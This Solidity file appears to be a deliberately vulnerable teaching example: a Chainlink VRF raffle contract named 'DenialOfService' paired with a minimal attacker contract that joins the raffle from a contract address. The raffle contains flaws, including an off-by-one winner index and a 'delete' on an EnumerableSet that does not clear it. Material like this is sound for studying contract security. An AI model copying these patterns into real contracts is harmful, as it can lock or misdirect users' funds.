// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {VRFCoordinatorV2Interface} from "@chainlink/contracts/src/v0.8/vrf/interfaces/VRFCoordinatorV2Interface.sol";
import {VRFConsumerBaseV2} from "@chainlink/contracts/src/v0.8/vrf/VRFConsumerBaseV2.sol";
import {EnumerableSet} from "@openzeppelin/contracts/utils/structs/EnumerableSet.sol";

contract DenialOfService is VRFConsumerBaseV2, Ownable {
    using EnumerableSet for EnumerableSet.AddressSet;

    error DenialOfService_UnableToRejoin();
    error DenialOfService_NotEnoughFee(uint fee);
    error DenialOfService_SendingEtherError();
    error DenialOfService_RaffleNotOpen();
    error DenialOfService_NotTheWinner(address winner);
    error DenialOfService_NotEnoughParticipants(uint256);
    error DenialOfService_DontHaveWinner();
    error DenialOfService_InsufficientBalance();

    EnumerableSet.AddressSet private s_participants;
    uint private s_participantFee;
    bool private s_isRaffleOpen;

    mapping(address winner => uint256 balance) private s_winnerBalance;

    // Chainlink VRF
    uint64 s_subscriptionId;
    address s_owner;
    VRFCoordinatorV2Interface COORDINATOR;
    address vrfCoordinator;

    // This key hash for Sepolia testnet
    bytes32 s_keyHash =
        0x474e34a077df58807dbe9c96d3c009b23b3c6d0cce433e59bbf5b34f823bc56c;
    uint32 callbackGasLimit = 100000;
    uint16 requestConfirmations = 3;
    uint32 numWords = 1;

    constructor(
        address _owner,
        address _vrfCoordinator,
        uint64 _subscriptionId
    ) Ownable(_owner) VRFConsumerBaseV2(_vrfCoordinator) {
        COORDINATOR = VRFCoordinatorV2Interface(_vrfCoordinator);
        s_owner = _owner;
        s_subscriptionId = _subscriptionId;
        s_isRaffleOpen = true;
    }

    event NewParticipantsEntered(address[] participants);
    event NewParticipantEntered(address participant);
    event LookingForAWinner(uint256 requestId);
    event GetTheWinner(uint256 requestId, address winner);
    event WinnerPrizeClaimed(address winner, uint256 prize);
    event SentPrizeToWinner(address winner, uint256 prize);

    function setFee(uint _fee) public onlyOwner {
        s_participantFee = _fee;
    }

    function enterRaffle(address[] memory newParticipants) public payable {
        if (msg.value != s_participantFee * newParticipants.length) {
            revert DenialOfService_NotEnoughFee(
                s_participantFee * newParticipants.length
            );
        }

        for (uint256 i; i < newParticipants.length; i++) {
            if (s_participants.contains(newParticipants[i])) {
                revert DenialOfService_UnableToRejoin();
            }

            s_participants.add(newParticipants[i]);
        }

        emit NewParticipantsEntered(newParticipants);
    }

    function enterRaffleSingle(address newParticipant) public payable {
        if (msg.value != s_participantFee) {
            revert DenialOfService_NotEnoughFee(s_participantFee);
        }

        if (s_participants.contains(newParticipant)) {
            revert DenialOfService_UnableToRejoin();
        }

        s_participants.add(newParticipant);

        emit NewParticipantEntered(newParticipant);
    }

    function getWinner() public onlyOwner returns (uint256 requestId) {
        if (s_participants.length() < 10) {
            revert DenialOfService_NotEnoughParticipants(
                s_participants.length()
            );
        }

        requestId = COORDINATOR.requestRandomWords(
            s_keyHash,
            s_subscriptionId,
            requestConfirmations,
            callbackGasLimit,
            numWords
        );

        s_isRaffleOpen = false;

        emit LookingForAWinner(requestId);
    }

    function fulfillRandomWords(
        uint256 requestId,
        uint256[] memory randomWords
    ) internal override {
        if (s_isRaffleOpen) {
            revert DenialOfService_RaffleNotOpen();
        }
        uint256 randomValue = (randomWords[0] % s_participants.length()) + 1;
        address winner = s_participants.at(randomValue);
        uint256 prize = (s_participants.length() - 1) * s_participantFee;

        s_winnerBalance[winner] = prize;
        s_isRaffleOpen = true;
        delete s_participants;

        emit GetTheWinner(requestId, winner);
    }

    function claimPrize() public {
        uint256 balance = s_winnerBalance[msg.sender];
        if (balance <= 0) {
            revert DenialOfService_InsufficientBalance();
        }

        s_winnerBalance[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: balance}("");

        if (!sent) {
            revert DenialOfService_SendingEtherError();
        }

        emit WinnerPrizeClaimed(msg.sender, balance);
    }

    function getParticipantFee() public view returns (uint) {
        return s_participantFee;
    }
}

contract AttackDenialOfService {
    DenialOfService immutable i_target;

    constructor(address _target) {
        i_target = DenialOfService(_target);
    }

    function deposit() public payable {}

    function attack() public {
        uint fee = i_target.getParticipantFee();
        i_target.enterRaffleSingle{value: fee}(address(this));
    }
}